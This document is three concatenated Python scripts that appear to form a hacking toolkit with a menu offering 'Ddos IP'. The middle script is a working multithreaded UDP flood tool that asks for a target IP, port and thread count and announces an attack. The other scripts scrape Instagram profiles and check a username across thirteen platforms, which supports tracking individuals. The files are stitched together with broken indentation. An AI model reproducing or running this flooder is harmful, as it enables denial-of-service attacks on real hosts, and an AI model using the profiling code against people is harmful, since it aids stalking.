import instaloader
import os
from colorama import Fore

def clear_screen():
    """Clear the screen based on the operating system."""
    os.system('cls' if os.name == 'nt' else 'clear')

def display_logo():
    """Display the ASCII logo."""
    print(f"""{Fore.RED}
                                ▄▀▀▀█▀▀▄  ▄▀▀▄ █  ▄▀▀▀█▀▀▄  ▄▀▀▀▀▄   ▄▀▀▀▀▄   ▄▀▀▀▀▄     
                               █    █  ▐ █  █ ▄▀ █    █  ▐ █      █ █      █ █    █      
                               ▐   █     ▐  █▀▄  ▐   █     █      █ █      █ ▐    █      
                                  █        █   █    █      ▀▄    ▄▀ ▀▄    ▄▀     █       
                                ▄▀       ▄▀   █   ▄▀         ▀▀▀▀     ▀▀▀▀     ▄▀▄▄▄▄▄▄▀ 
                               █         █    ▐  █                             █         
                               ▐         ▐       ▐                             ▐      
    {Fore.RESET}""") 
    print("\n\n")
    print("                             +--------------------------------------------------------+")
    print("                             |   1) Instagram User Info                               |")
    print("                             |                                                        |")
    print("                             |   2) Ddos IP                                           |") 
    print("                             |                                                        |")
    print("                             |   3) Track Username                                    |") 
    print("                             +--------------------------------------------------------+\n\n")

def handle_error(message):
    """Print an error message."""
    print(f"{Fore.RED}Error: {message}{Fore.RESET}")

def get_profile_info(username):
    """Fetch and display Instagram profile information."""
    try:
        loader = instaloader.Instaloader()
        profile = instaloader.Profile.from_username(loader.context, username)

        print(f"Username: {profile.username}")
        print(f"Name: {profile.full_name}")
        print(f"Bio: {profile.biography}")
        print(f"Followers: {profile.followers}")
        print(f"Following: {profile.followees}")
        print(f"Posts: {profile.mediacount}")
        print(f"Profile Picture URL: {profile.profile_pic_url}\n")

        for post in profile.get_posts():
            print(f"Post URL: {post.url}")
            print(f"Caption: {post.caption[:100]}")
            print(f"Likes: {post.likes}")
            print(f"Comments: {post.comments}\n")

    except instaloader.exceptions.InstaloaderException as e:
        handle_error(str(e))

def main():
    clear_screen()
    display_logo()
    option = input("----~$:")

    if option == "1":
        username = input("Enter Instagram username: ")
        get_profile_info(username)

    if option == "2":
        clear_screen()

    if option == "3":
        main()

if __name__ == "__main__":
    main()

    from socket import socket, AF_INET, SOCK_DGRAM
from threading import Thread
import os
from random import randint
from time import time, sleep
from getpass import getpass as hinput
from pystyle import Colors

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

class UDPFlooder:
    def __init__(self, ip, port, packet_size, thread_count):
        self.ip = ip
        self.port = port
        self.packet_size = packet_size
        self.thread_count = thread_count

        self.client = socket(AF_INET, SOCK_DGRAM)
        self.packet_data = b"x" * self.packet_size
        self.packet_length = len(self.packet_data)

    def start_flood(self):
        self.is_active = True
        self.sent_bytes = 0
        for _ in range(self.thread_count):
            Thread(target=self.send_packets).start()
        Thread(target=self.monitor_traffic).start()

    def stop_flood(self):
        self.is_active = False

    def send_packets(self):
        while self.is_active:
            try:
                self.client.sendto(self.packet_data, (self.ip, self._get_random_port()))
                self.sent_bytes += self.packet_length
            except Exception as e:
                print(f"{Colors.red}Error sending packet: {e}{Colors.reset}")

    def _get_random_port(self):
        return self.port if self.port else randint(1, 65535)

    def monitor_traffic(self):
        interval = 0.05
        start_time = time()
        total_bytes_sent = 0
        while self.is_active:
            sleep(interval)
            current_time = time()
            if current_time - start_time >= 1:
                speed_mbps = self.sent_bytes * 8 / (1024 * 1024) / (current_time - start_time)
                total_bytes_sent += self.sent_bytes
                print(f"{Colors.red}Speed: {speed_mbps:.2f} Mb/s - Total: {total_bytes_sent / (1024 * 1024 * 1024):.2f} Gb{Colors.reset}", end='\r')
                start_time = current_time
                self.sent_bytes = 0

def get_input(prompt, default=None, cast_type=int):
    value = input(prompt)
    if value == '':
        return default
    try:
        return cast_type(value)
    except ValueError:
        print(f"{Colors.red}Invalid input. Please enter a valid {cast_type.__name__}.{Colors.reset}")
        return get_input(prompt, default, cast_type)

def main():
    clear_screen()
    ip = input(f"{Colors.red}Enter the target IP address: {Colors.reset}")
    if not ip.count('.') == 3:
        print(f"{Colors.red}Error! Please enter a valid IP address.{Colors.reset}")
        return

    port = get_input(f"{Colors.red}Enter the target port (or press enter to target all ports): {Colors.reset}", default=None, cast_type=int)
    packet_size = get_input(f"{Colors.red}Enter the packet size in bytes (default is 1250): {Colors.reset}", default=1250)
    thread_count = get_input(f"{Colors.red}Enter the number of threads (default is 100): {Colors.reset}", default=100)

    flooder = UDPFlooder(ip, port, packet_size, thread_count)
    
    try:
        flooder.start_flood()
        print(f"{Colors.red}Starting attack on {ip}:{port if port else 'all ports'}{Colors.reset}")
        while True:
            sleep(1000000)
    except KeyboardInterrupt:
        flooder.stop_flood()
        print(f"{Colors.red}Attack stopped. Total data sent: {flooder.sent_bytes / (1024 * 1024 * 1024):.2f} Gb{Colors.reset}")

if __name__ == '__main__':
    main()

import os
import sys
import time
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from deep_translator import GoogleTranslator
from pystyle import Colors


def main():
    pass

def Continue():
    input(f"\n{Colors.red}Press Enter to continue...")

def clear():
    print("\033c", end="")

def OnlyWindows():
    print(f"{Colors.red}This option is only available on Windows.")
    Continue()
    clear()

def OnlyLinux():
    print(f"{Colors.red}This option is only available on Linux.")
    Continue()
    clear()

def ErrorChoice():
    print(f"{Colors.red}Invalid choice. Please select a valid option.")
    Continue()
    clear()

def ErrorModule(e):
    print(f"{Colors.red}Error importing module: {e}")
    Continue()
    clear()

def Error(e):
    print(f"An error occurred: {e}")
    Continue()
    clear()

def text_translated(text):
    try:
        translated_text = GoogleTranslator(source='auto', target='en').translate(text)
    except: 
        translated_text = text
    return translated_text

def tiktok_search(driver, username):
    try:
        link = f"https://www.tiktok.com/@{username}"
        driver.get(link)
        driver.implicitly_wait(10)
        time.sleep(2)
        if "This account cannot be found" in text_translated(driver.execute_script("return document.documentElement.innerText")):
            return False
        else:
            return link
    except Exception as e:
        return f"Error: {e}"

def instagram_search(driver, username):
    try:
        link = f"https://instagram.com/{username}"
        driver.get(link)
        driver.implicitly_wait(10)
        time.sleep(2)
        if "This page is unfortunately not available" in text_translated(driver.execute_script("return document.documentElement.innerText")):
            return False
        else:
            return link
    except Exception as e:
        return f"Error: {e}"

def giters_search(driver, username):
    try:
        link = f"https://giters.com/{username}"
        driver.get(link)
        driver.implicitly_wait(10)
        time.sleep(2)
        if "This page could not be found" in text_translated(driver.execute_script("return document.documentElement.innerText")):
            return False
        elif username in driver.execute_script("return document.documentElement.innerText"):
            return link
        else:
            return False
    except Exception as e:
        return f"Error: {e}"

def github_search(driver, username):
    try:
        link = f"https://github.com/{username}"
        driver.get(link)
        driver.implicitly_wait(10)
        time.sleep(2)
        if "Find code, projects, and people on GitHub" in text_translated(driver.execute_script("return document.documentElement.innerText")):
            return False
        else:
            return link
    except Exception as e:
        return f"Error: {e}"

def paypal_search(driver, username):
    try:
        link = f"https://www.paypal.com/paypalme/{username}"
        driver.get(link)
        driver.implicitly_wait(10)
        time.sleep(2)
        if "We cannot find this profile" in text_translated(driver.execute_script("return document.documentElement.innerText")):
            return False
        elif "We were not able to process your request. Please try again later" in text_translated(driver.execute_script("return document.documentElement.innerText")):
            return "Error: Rate Limit"
        else:
            return link
    except Exception as e:
        return f"Error: {e}"

def telegram_search(driver, username):
    try:
        link = f"https://t.me/{username}"
        driver.get(link)
        driver.implicitly_wait(10)
        time.sleep(2)
        if "If you have Telegram, you can contact" in text_translated(driver.execute_script("return document.documentElement.innerText")):
            return False
        elif "a new era of messaging" in text_translated(driver.execute_script("return document.documentElement.innerText")):
            return False
        else:
            return link
    except Exception as e:
        return f"Error: {e}"

def snapchat_search(driver, username):
    try:
        link = f"https://www.snapchat.com/add/{username}"
        driver.get(link)
        driver.implicitly_wait(10)
        time.sleep(2)
        if "This content could not be found" in text_translated(driver.execute_script("return document.documentElement.innerText")):
            return False
        else:
            return link
    except Exception as e:
        return f"Error: {e}"

def linktree_search(driver, username):
    try:
        link = f"https://linktr.ee/{username}"
        driver.get(link)
        driver.implicitly_wait(10)
        time.sleep(2)
        if "The page you’re looking for doesn’t exist" in text_translated(driver.execute_script("return document.documentElement.innerText")):
            return False
        else:
            return link
    except Exception as e:
        return f"Error: {e}"

def roblox_search(driver, username):
    try:
        link = f"https://www.roblox.com/search/users?keyword={username}"
        driver.get(link)
        driver.implicitly_wait(10)
        time.sleep(2)
        if "No results available for" in text_translated(driver.execute_script("return document.documentElement.innerText")):
            return False
        else:
            return link
    except Exception as e:
        return f"Error: {e}"

def streamlabs_search(driver, username):
    try:
        link = f"https://streamlabs.com/{username}/tip"
        driver.get(link)
        driver.implicitly_wait(10)
        time.sleep(2)
        if "UNAUTHORIZED" in text_translated(driver.execute_script("return document.documentElement.innerText")):
            return False
        elif "401" in text_translated(driver.execute_script("return document.documentElement.innerText")):
            return False
        else:
            return link
    except Exception as e:
        return f"Error: {e}"

def pinterest_search(driver, username):
    try:
        link = f"https://www.pinterest.com/{username}"
        driver.get(link)
        driver.implicitly_wait(10)
        time.sleep(2)
        if "Sorry, we couldn’t find any Pins for" in text_translated(driver.execute_script("return document.documentElement.innerText")):
            return False
        else:
            return link
    except Exception as e:
        return f"Error: {e}"

def reddit_search(driver, username):
    try:
        link = f"https://www.reddit.com/user/{username}"
        driver.get(link)
        driver.implicitly_wait(10)
        time.sleep(2)
        if "Sorry, nobody on Reddit goes by that name" in text_translated(driver.execute_script("return document.documentElement.innerText")):
            return False
        else:
            return link
    except Exception as e:
        return f"Error: {e}"

def twitter_search(driver, username):
    try:
        link = f"https://twitter.com/{username}"
        driver.get(link)
        driver.implicitly_wait(10)
        time.sleep(2)
        if "This account doesn’t exist" in text_translated(driver.execute_script("return document.documentElement.innerText")):
            return False
        else:
            return link
    except Exception as e:
        return f"Error: {e}"


try:
    clear()
    username = input((f"\n Username : "))

    print(f"""{Colors.red}
[01] -> Chrome (Linux)
[02] -> Chrome (Windows)
[03] -> Firefox (Windows)
[04] -> Edge (Windows)
    """)
    browser = input(f"{Colors.red}Browser : ")

    if browser in ['1', '01']:
        if sys.platform.startswith("win"):
            OnlyWindows()
        try:
            navigator = "Chrome Linux"
            print(f"Starting {navigator}..")
            chrome_driver_path = os.path.abspath("./Driver/chromedriverlinux")
            chrome_options = webdriver.ChromeOptions()
            chrome_options.add_argument(f"webdriver.chrome.driver={chrome_driver_path}")
            driver = webdriver.Chrome(options=chrome_options)
            print(f"{navigator} Ready!")
        except:
            print( f"{navigator} not installed or driver not up to date.")
            Continue()
            clear()
            
    elif browser in ['2', '02']:
        if sys.platform.startswith("linux"):
            OnlyLinux()
        try:
            navigator = "Chrome"
            print(f"Starting {navigator}..")
            driver = webdriver.Chrome()
            print(f"{navigator} Ready!")
        except:
            print(f"{navigator} not installed or driver not up to date.")
            Continue()
            clear()

    elif browser in ['3', '03']:
        if sys.platform.startswith("linux"):
            OnlyLinux()
        try:
            navigator = "Firefox"
            print(f"Starting {navigator}..")
            driver = webdriver.Firefox()
            print(f"{navigator} Ready!")
        except:
            print(f"{navigator} not installed or driver not up to date.")
            Continue()
            clear()

    elif browser in ['4', '04']:
        if sys.platform.startswith("linux"):
            OnlyLinux()
        try:
            navigator = "Edge"
            print(f"Starting {navigator}..")
            driver = webdriver.Edge()
            print(f"{navigator} Ready!")
        except:
            print(f"{navigator} not installed or driver not up to date.")
            Continue()
            clear()
    else:
        ErrorChoice()

    driver.set_window_size(900, 600)

    results = {
        "Tiktok": tiktok_search(driver, username),
        "Instagram": instagram_search(driver, username),
        "Snapchat": snapchat_search(driver, username),
        "Giters": giters_search(driver, username),
        "Github": github_search(driver, username),
        "Paypal": paypal_search(driver, username),
        "Telegram": telegram_search(driver, username),
        "Linktree": linktree_search(driver, username),
        "Roblox": roblox_search(driver, username),
        "Streamlabs": streamlabs_search(driver, username),
        "Pinterest": pinterest_search(driver, username),
        "Reddit": reddit_search(driver, username),
        "Twitter": twitter_search(driver, username)
    }

    print(f"""
The username "{username}" was found:

    Tiktok     : {results.get('Tiktok')}
    Instagram  : {results.get('Instagram')}
    Snapchat   : {results.get('Snapchat')}
    Giters     : {results.get('Giters')}
    Github     : {results.get('Github')}
    Paypal     : {results.get('Paypal')}
    Telegram   : {results.get('Telegram')}
    Linktree   : {results.get('Linktree')}
    Roblox     : {results.get('Roblox')}
    Streamlabs : {results.get('Streamlabs')}
    Pinterest  : {results.get('Pinterest')}
    Reddit     : {results.get('Reddit')}
    Twitter    : {results.get('Twitter')}
    """)

    driver.quit()

    Continue()
except Exception as e:
    Error(e)

if __name__ == "__main__":
    main()
